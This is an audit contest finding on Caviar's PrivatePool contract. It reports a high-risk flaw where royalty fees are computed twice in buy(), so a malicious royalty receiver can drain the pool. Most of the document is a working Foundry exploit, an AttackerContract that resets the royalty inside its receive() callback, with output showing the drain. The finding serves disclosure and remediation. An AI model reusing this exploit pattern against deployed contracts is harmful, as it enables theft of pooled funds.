## Tags

- bug
- 3 (High Risk)
- primary issue
- selected for report
- edited-by-warden
- H-01

# [Royalty receiver can drain a private pool](https://github.com/code-423n4/2023-04-caviar-findings/issues/320) 

# Lines of code

https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L252
https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268
https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L274


# Vulnerability details

## Impact
Royalty fee calculation has a serious flaw in `buy(...)`. Caviar's private pools could be completely drained.

In the Caviar private pool, [NFT royalties](https://eips.ethereum.org/EIPS/eip-2981) are being paid from the `msg.sender` to the NFT royalty receiver of each token in PrivatePool.buy and PrivatePool.sell:

https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L271-L285
```solidity
        #buy(uint256[],uint256[],MerkleMultiProof)

271:    if (payRoyalties) {
            ...
274:        (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);
            ...
278:        if (baseToken != address(0)) {
279:            ERC20(baseToken).safeTransfer(recipient, royaltyFee);
280:        } else {
281:            recipient.safeTransferETH(royaltyFee);
282:        }
```

https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L328-L352
```solidity
        #sell(uint256[],uint256[],MerkleMultiProof,IStolenNftOracle.Message[])

329:    for (uint256 i = 0; i < tokenIds.length; i++) {
            ...
333:        if (payRoyalties) {
                ...
338:            (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);
                ...
345:            if (baseToken != address(0)) {
346:                ERC20(baseToken).safeTransfer(recipient, royaltyFee);
347:            } else {
348:                recipient.safeTransferETH(royaltyFee);
349:            }
```

In both functions, the amount needed to pay all royalties is taken from the `msg.sender` who is either the buyer or the seller depending on the context. In PrivatePool.sell, this amount is first paid by the pool and then taken from the `msg.sender` by simply reducing what they receive in return for the NFTs they are selling. A similar thing is done in PrivatePool.buy, but instead of reducing the output amount, the input amount of base tokens that the `msg.sender` (buyer) should pay to the pool is increased:

https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L251-L252
```solidity
        #buy(uint256[],uint256[],MerkleMultiProof)

251:    // add the royalty fee amount to the net input aount
252:    netInputAmount += royaltyFeeAmount;
```

https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L354-L355
```solidity
        #sell(uint256[],uint256[],MerkleMultiProof,IStolenNftOracle.Message[])

354:    // subtract the royalty fee amount from the net output amount
355:    netOutputAmount -= royaltyFeeAmount;
```

The difference between these two functions (that lies at the core of the problem) is that in PrivatePool.buy, the `_getRoyalty` function is called twice. The first time is to calculate the total amount of royalties to be paid, and the second time is to actually send each royalty fee to each recipient:

https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L242-L248
https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L273-L274
```solidity
        #buy(uint256[],uint256[],MerkleMultiProof)

242:    if (payRoyalties) {
243:        // get the royalty fee for the NFT
244:        (uint256 royaltyFee,) = _getRoyalty(tokenIds[i], salePrice); // @audit _getRoyalty called 1st time
245:
246:        // add the royalty fee to the total royalty fee amount
247:        royaltyFeeAmount += royaltyFee;
248:    }
        
        ...
        
273:    // get the royalty fee for the NFT
274:    (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice); // @audit  _getRoyalty called 2nd time
```

This is problematic because an attacker could potentially change the royalty fee between the two calls, due to the following untrusted external call:

https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268
```solidity
        #buy(uint256[],uint256[],MerkleMultiProof)

267:    // refund any excess ETH to the caller
268:    if (msg.value > netInputAmount) msg.sender.safeTransferETH(msg.value - netInputAmount); // @audit untrusted external call
```

If the `msg.sender` is a malicious contract that has control over the `royaltyFee` for the NFTs that are being bought, they can change it, for example, from 0 basis points (0%) to 10000 basis points (100%) in their `receive()` function.

https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/common/ERC2981.sol#L94-L99
```solidity
        // @audit An attacker can call this setter function between the two `_getRoyalty()` calls.
94:     function _setTokenRoyalty(uint256 tokenId, address receiver, uint96 feeNumerator) internal virtual {
95:         require(feeNumerator <= _feeDenominator(), "ERC2981: royalty fee will exceed salePrice");
96:         require(receiver != address(0), "ERC2981: Invalid parameters");
97:
98:         _tokenRoyaltyInfo[tokenId] = RoyaltyInfo(receiver, feeNumerator);
99:     }
```

That way, the amount transferred by the `msg.sender` for royalties will be 0 because the total `royaltyFeeAmount` is calculated based on the first value (0%) but the actual sent amount to the receiver is determined by the second value (100%). This will result in the whole price paid for the NFT being returned to the royalty receiver, but being paid by the Pool instead of the `msg.sender`.

The `msg.sender` has therefore received the NFT but paid the whole price for it to the royalty receiver and 0 to the Pool. If the `msg.sender` is the royalty receiver, they will basically have spent 0 base tokens (not counting gas expenses) but received the NFT in their account. They can then sell it to the same private pool to exchange it for base tokens.

This is an extreme scenario, however, the developers have acknowledged ERC-2981 and that `royaltyInfo(...)` returns an arbitrary address. In the future we could see projects that have royalty payments that fluctuate such as increasing/decaying royalties over time [article on eip 2981](https://www.gemini.com/blog/exploring-the-nft-royalty-standard-eip-2981) or projects that delegate the creation of nfts to the users such as 1024pixels [polygon](0x1024Accd05Fa01AdbB74502DBDdd8e430d610c53), [git repo](https://github.com/michaelliao/1024pixels/blob/master/contracts/1024pixels.sol) and royalties are paid to each user rather to a single creator. In such cases invocation of `_getRoyalty(...)`  twice with external calls that transfer assets in-between is a vulnerable pattern that is sure to introduce asset risks and calculation inaccuracies both for the users and protocol itself. Immediate remedy would be to simplify `buy(...)` in `PrivatePool.sol` to use only one `for loop` and call `_getRoyalty(...)` once.  

PoC shows how the entire Pool's base tokens can be drained by a single royalty receiver using a single NFT assuming that the royalty receiver has control over the royaltyFee.

## Proof of Concept

Place the following test in [2023-04-caviar/test](https://github.com/code-423n4/2023-04-caviar/tree/main/test).

Run `forge test --ffi -m test_MaliciousRoyaltyReceiverDrainPrivatePool -vv`.

The expected output in the terminal is:

```
  ==========================================
   Before the exploit
  ==========================================
   | Attacker balance:            100.0 ETH
   | Pool balance:                100.0 ETH
  ==========================================
  
  ==========================================
   After the exploit
  ==========================================
   | Attacker balance:            199.9 ETH
   | Pool balance:                0.1 ETH
  ==========================================
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC721Royalty, ERC721} from "@openzeppelin/contracts/token/ERC721/extensions/ERC721Royalty.sol";

import {ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";

import {Fixture} from "./Fixture.sol";
import {PrivatePool} from "../src/PrivatePool.sol";
import {IStolenNftOracle} from "../src/interfaces/IStolenNftOracle.sol";

import "forge-std/console.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

/**
 * @title Mock NFT collection contract.
 * @notice This contract follows the EIP721 and EIP2981 standards.
 * @dev Inherits OpenZeppelin's contracts.
 */
contract ERC721RoyaltyCollection is Ownable, ERC721Royalty {
    /// @notice Counter variable for token IDs.
    uint256 public tokenId;

    /**
     * @dev Ownership is given to the deployer (msg.sender).
     * @param _name ERC721 name property.
     * @param _symbol ERC721 symbol property.
     */
    constructor(
        string memory _name,
        string memory _symbol
    ) ERC721(_name, _symbol) {}

    modifier onlyRoyaltyReceiver(uint256 _tokenId) {
        (address receiver, ) = royaltyInfo(_tokenId, 0);
        require(msg.sender == receiver);
        _;
    }

    /**
     * @notice Mints an NFT and sets information regarding royalties.
     * @notice Each NFT costs 1 ETH to mint and the funds go to the DAO behind the project.
     * @param _to The account that the NFT will be minted to.
     * @param _royaltyReceiver The receiver of any royalties paid per each sale.
     * @param _royaltyFeeNumerator The fee percentage in basis points that represents
     * how much of each sale will be transferred to the royalty receiver.
     */
    function mint(
        address _to,
        address _royaltyReceiver,
        uint96 _royaltyFeeNumerator
    ) external payable {
        require(msg.value == 1 ether);
        _mint(_to, tokenId);
        _setTokenRoyalty(tokenId++, _royaltyReceiver, _royaltyFeeNumerator);
    }

    /**
     * @notice Only the current royalty receiver is allowed to
     * determine the new receiver address and the new fee percentage.
     * @param _tokenId The token whose royalty data will be changed.
     * @param _royaltyReceiver The new royalty receiver address (can remain the same).
     * @param _royaltyFeeNumerator The new royalty fee basis points (can remain the same).
     */
    function setTokenRoyalty(
        uint256 _tokenId,
        address _royaltyReceiver,
        uint96 _royaltyFeeNumerator
    ) external onlyRoyaltyReceiver(_tokenId) {
        _setTokenRoyalty(_tokenId, _royaltyReceiver, _royaltyFeeNumerator);
    }

    /**
     * @notice Withdraw all revenue from the NFT sales.
     * @dev This function is only callable by the owner/DAO behind the project.
     */
    function withdraw() external onlyOwner {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
}

/**
 * @title AttackerContract.
 * @notice The main logic for exploiting the vulnerability in PrivatePool.sol.
 */
contract AttackerContract is Ownable, ERC721TokenReceiver {
    /// @notice The NFT collection contract that is used by the private pool.
    ERC721RoyaltyCollection public nft;

    /// @notice The Caviar private pool that incorrectly calculates royalties.
    PrivatePool public vulnerablePrivatePool;

    /// @notice The target token ID that will be used to perform the exploit.
    uint256 public tokenId;

    /// @notice Needed to reset state after attack is performed.
    uint256 public originalFee;

    /// @notice Helper flags needed to navigate the attack path in the receive() function.
    bool public f1;
    bool public f2;

    /**
     * @param _vulnerablePrivatePool The address of the targeted Caviar private pool.
     * @param _nft The NFT collection address.
     * @param _tokenId The specific NFT that will be used for the exploit.
     */
    constructor(
        address payable _vulnerablePrivatePool,
        address _nft,
        uint256 _tokenId
    ) {
        nft = ERC721RoyaltyCollection(_nft);
        vulnerablePrivatePool = PrivatePool(_vulnerablePrivatePool);

        tokenId = _tokenId;
    }

    /**
     * @notice Executes the attack. Drains the base token balance of the private pool and sends it to the owner.
     * @param iterations How many times to perform the attack in order to drain the entire base token balance of the pool.
     * @param tokenIds An array including only the tokenId that will be used to perform the attack.
     * @param tokenWeights Empty array if the merkle root is bytes32(0).
     * @param proof Empty if the merkle root is bytes32(0).
     */
    function attack(
        uint256 iterations,
        uint256[] calldata tokenIds,
        uint256[] calldata tokenWeights,
        PrivatePool.MerkleMultiProof calldata proof
    ) external payable onlyOwner {
        // Execute attack.
        for (uint256 i; i < iterations; i++) {
            vulnerablePrivatePool.buy{value: msg.value}(
                tokenIds,
                tokenWeights,
                proof
            );
        }

        // Return all assets to the owner/original receiver.
        (bool success, ) = payable(owner()).call{value: address(this).balance}(
            ""
        );

        // Ensure the call was successful.
        require(success);
    }

    /**
     * @notice Main logic for the exploit.
     */
    receive() external payable {
        // Do not allow arbitrary calls.
        require(msg.sender == address(vulnerablePrivatePool));

        // Return if the call comes from PrivatePool.sell().
        if (f2) return;

        // We should enter the next block only if the call
        // comes from the ETH excess refund in PrivatePool.buy().
        if (!f1) {
            // Do not enter again for this iteration.
            f1 = true;

            // Cache the original fee in order to reset it later.
            (, originalFee) = nft.royaltyInfo(tokenId, 10_000);

            // Increase the royalty fee significantly to get back the price we paid for buying it.
            nft.setTokenRoyalty(tokenId, address(this), 10_000);

            // Return to PrivatePool.buy().
            return;
        }

        // Reset the fee.
        nft.setTokenRoyalty(tokenId, address(this), uint96(originalFee));

        // Set the second flag used to not execute any logic if the call comes from PrivatePool.sell().
        f2 = true;

        // Approve the bought NFT to the Caviar private pool.
        nft.approve(address(vulnerablePrivatePool), tokenId);

        // Sell the bought NFT in order to extract base tokens from the vulnerable private pool.
        vulnerablePrivatePool.sell(
            new uint256[](1),
            new uint256[](0),
            PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),
            new IStolenNftOracle.Message[](0)
        );

        // Reset state variables so attack can be performed one more iteration.
        delete originalFee;
        delete f1;
        delete f2;
    }
}

contract MaliciousRoyaltyReceiverDrainPrivatePoolTest is Fixture {
    /// @notice The NFT collection contract that is used by the private pool.
    ERC721RoyaltyCollection public nft;

    /// @notice The Caviar private pool that incorrectly calculates royalties.
    PrivatePool public privatePool;

    /// @notice Merkle root is set to bytes32(0) to make setup simpler.
    bytes32 constant MERKLE_ROOT = bytes32(0);

    /// @notice The private pool has initial balance/reserve of 100 ETH (the base token is address(0)).
    uint128 constant VIRTUAL_BASE_TOKEN_RESERVES = 100e18;

    /// @notice The private pool has 5 NFTs, each one with a wight of 1e18 (the merkle root is bytes32(0)).
    uint128 constant VIRTUAL_NFT_RESERVES = 5e18;

    /// @notice The specific NFT that will be used to perform the epxloit.
    /// @notice The attacker should be the royalty receiver of this NFT.
    /// @dev Zero is used so we can pass `new uint256[](1)` as the tokenIds array.
    uint256 tokenId = 0;

    // The attacker. It is set as a royalty receiver to NFT#tokenId that will be used to perform the exploit.
    address receiver;

    function setUp() external {
        // The attacker.
        receiver = vm.addr(1);

        // The NFT collection the will be used by the private pool.
        nft = new ERC721RoyaltyCollection("VoyvodaSec", "VSC");

        _deployPrivatePool();
        _depositNFTs(tokenId);

        _fundEth();

        // Assert setup.
        assertEq(
            privatePool.nft(),
            address(nft),
            "Setup: NFT collection not set correctly."
        );
        assertEq(
            nft.ownerOf(tokenId),
            address(privatePool),
            "Setup: the NFT should initially be deposited to the private pool."
        );

        assertEq(
            privatePool.baseToken(),
            address(0),
            "Setup: the private pool base token should be ETH."
        );
        assertEq(
            address(privatePool).balance,
            VIRTUAL_BASE_TOKEN_RESERVES,
            "Setup: incorrect initial amount of ETH supplied to pool."
        );

        // Log initial state (before attack).
        _logState(" Before the exploit");
    }

    function test_MaliciousRoyaltyReceiverDrainPrivatePool() external {
        // 0. Execute the following steps from the royalty receiver (the attacker) account.
        vm.startPrank(receiver);

        // 1. Deploy the attacker contract that contains the main exploit logic.
        AttackerContract maliciousReceiverContract = new AttackerContract(
            payable(privatePool),
            address(nft),
            tokenId
        );

        assertEq(maliciousReceiverContract.owner(), receiver);

        // 2. Change the royalty receiver for NFT#tokenId to the attacker contract.
        nft.setTokenRoyalty(tokenId, address(maliciousReceiverContract), 10);

        (address newRoyaltyReceiver, ) = nft.royaltyInfo(tokenId, 10_000);
        assertEq(newRoyaltyReceiver, address(maliciousReceiverContract));

        // 3. Execute the attack.
        maliciousReceiverContract.attack{value: 100 ether}(
            4, // 4 iterations are needed to drain the whole private ETH balance having the current setup.
            new uint256[](1), // This will pass the following array as tokenIds - [0].
            new uint256[](0),
            PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))
        );

        // Log state after pool was drained.
        _logState(" After the exploit");
    }

    // ======================================= Helpers ======================================= //

    /**
     * @notice Deploy and initialize an instance of the vulnerable private pool implementation.
     */
    function _deployPrivatePool() internal {
        // Deploy pool implementation.
        privatePool = new PrivatePool(
            address(factory),
            address(royaltyRegistry),
            address(stolenNftOracle)
        );

        // Initialize pool instance.
        privatePool.initialize(
            address(0),
            address(nft),
            VIRTUAL_BASE_TOKEN_RESERVES,
            VIRTUAL_NFT_RESERVES,
            0,
            0,
            MERKLE_ROOT,
            false,
            true
        );
    }

    /**
     * @notice Simulates deposits of 5 NFTs to the private pool.
     * @param _targetTokenId The specific NFT that will be
     * used by the attacker to perform the exploit.
     */
    function _depositNFTs(uint256 _targetTokenId) internal {
        for (uint256 i = 0; i < 5; i++) {
            // Mint NFTs directly to the Pool to make setup easier.
            nft.mint{value: 1 ether}(
                address(privatePool),
                i == _targetTokenId ? receiver : vm.addr(type(uint64).max), // Set the attacker/royalty receiver account to the passed token only.
                uint96(10)
            );
        }
    }

    /**
     * @notice Funds ETH to the accounts that will need native tokens for this test case.
     */
    function _fundEth() internal {
        vm.deal(address(privatePool), VIRTUAL_BASE_TOKEN_RESERVES);
        vm.deal(receiver, 100e18);
    }

    /**
     * @notice Logs the current state to show the exploit status in the terminal.
     */
    function _logState(string memory state) internal view {
        console.log("");
        console.log("==========================================");
        console.log(state);
        console.log("==========================================");
        console.log(
            string.concat(
                " | Attacker balance:            ",
                string.concat(
                    Strings.toString(receiver.balance / 1e18),
                    ".",
                    Strings.toString((receiver.balance % 1e18) / 1e17)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Pool balance:                ",
                string.concat(
                    Strings.toString(address(privatePool).balance / 1e18),
                    ".",
                    Strings.toString(
                        (address(privatePool).balance % 1e18) / 1e17
                    )
                ),
                " ETH"
            )
        );
        console.log("==========================================");
    }
}
```

## Tools Used
Manual review, Foundry

## Recommended Mitigation Steps
Ensure that the amount sent to the NFT royalty receivers in the second `for` loop in `buy()` is the same as the amount calculated in the first `for` loop.